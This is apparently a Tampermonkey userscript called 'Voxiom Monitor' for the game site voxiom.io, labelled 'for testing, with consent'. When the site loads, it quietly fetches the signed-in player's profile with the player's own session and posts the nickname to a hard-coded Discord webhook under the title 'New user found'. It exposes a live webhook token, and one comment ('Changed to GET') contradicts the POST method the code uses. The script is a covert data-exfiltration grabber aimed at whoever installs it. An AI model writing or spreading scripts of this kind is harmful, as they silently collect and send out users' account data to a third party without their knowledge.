// ==UserScript==
// @name         Voxiom Monitor
// @namespace    http://tampermonkey.net/
// @version      2025-08-14
// @description  Monitors voxiom.io activity (for testing, with consent)
// @author       You
// @match        https://voxiom.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=voxiom.io
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    'use strict';

    GM_xmlhttpRequest({
        method: 'POST', // Changed to GET for profile fetch
        url: 'https://voxiom.io/profile/me',
        onload: function(response) {
            try {
                const data = JSON.parse(response.responseText);
                const nickname = data.data?.nickname || 'No nickname found';
                const embed = {
                    embeds: [{
                        title: 'New user found',
                        description: `Username: ${nickname}\n[Player Profile](https://voxiom.io/player/${encodeURIComponent(nickname)})`,
                        image: { url: 'https://i.ibb.co/dst4n8h5/log-cabin-log.gif' }
                    }]
                };
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: 'https://discord.com/api/webhooks/1405686016022413332/Z4doD6JB6O9DPT-E5LAcDV8VpcUej7tKrcJVZ5nnZx9r-S_aU_gYe_YFUj9wZZ7FE4yd',
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(embed),
                    onload: () => console.log('Webhook sent'),
                    onerror: (error) => console.error('Webhook error:', error)
                });
            } catch (e) {
                console.error('Parse error:', e);
            }
        },
        onerror: (error) => console.error('Fetch error:', error)
    });
})();
